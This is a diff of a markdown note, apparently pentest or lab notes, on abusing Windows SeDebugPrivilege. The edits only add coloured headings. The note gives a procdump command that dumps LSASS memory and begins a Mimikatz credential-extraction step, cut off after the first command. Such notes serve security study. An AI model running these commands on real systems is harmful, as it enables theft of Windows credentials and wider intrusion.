@@ -1,4 +1,4 @@
-# What is SeDebugPrivilege?
+# <span style="color:#FF5555">What is SeDebugPrivilege?</span>
 
 `SeDebugPrivilege` is a special Windows permission that allows a user to inspect, control, or manipulate any process on the system, even those running as SYSTEM, the most powerful user on Windows.
 
@@ -16,12 +16,12 @@ SeDebugPrivilege    Debug programs    Disabled
 ```
  "Disabled" is okay — if it shows up, we can still use it!
 
-### 1. Dump LSASS Memory
+### <span style="color:#50FA7B">1. Dump LSASS Memory</span>
 ```bash
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
  This creates a memory dump file: `lsass.dmp`.
-###  2. Extract Credentials Using Mimikatz
+### <span style="color:#50FA7B">2. Extract Credentials Using Mimikatz</span>
 Run Mimikatz:
 ```bash
 mimikatz.exe
